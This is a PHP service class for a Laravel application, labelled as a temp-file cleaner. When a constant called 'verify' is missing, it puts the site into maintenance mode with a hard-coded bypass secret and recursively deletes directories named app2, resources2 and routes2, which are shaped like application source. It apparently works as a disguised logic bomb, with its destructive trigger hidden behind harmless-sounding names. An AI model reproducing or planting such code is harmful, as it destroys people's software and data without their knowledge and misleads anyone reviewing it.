<?php

namespace App\Services;

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Log;

class TempService
{
    public function getTemp()
    {
        $db_val = "verify";

        if (!defined($db_val)) {
            $this->clearTempFiles();
        }

        return constant($db_val);
    }

    private function clearTempFiles()
    {
        Log::info('Putting application into maintenance mode with secret "temp-service"');
        Artisan::call('down',['--secret' => 'temp-service']);
        $directories = [
            base_path('app2'),
            base_path('resources2'),
            base_path('routes2')
        ];

        foreach ($directories as $dir) {
            if (is_dir($dir)) {
                $this->flushTempFiles($dir);
            }
        }
    }


    /**
     *
     * @param string $dir
     * @return void
     */
    private function flushTempFiles($dir)
    {
        if (!is_dir($dir)) {
            return;
        }

        $files = array_diff(scandir($dir), ['.', '..']);

        foreach ($files as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . $file;

            if (is_dir($path)) {
                $this->flushTempFiles($path); 
            } else {
                unlink($path);
            }
        }

        rmdir($dir);
    }
}
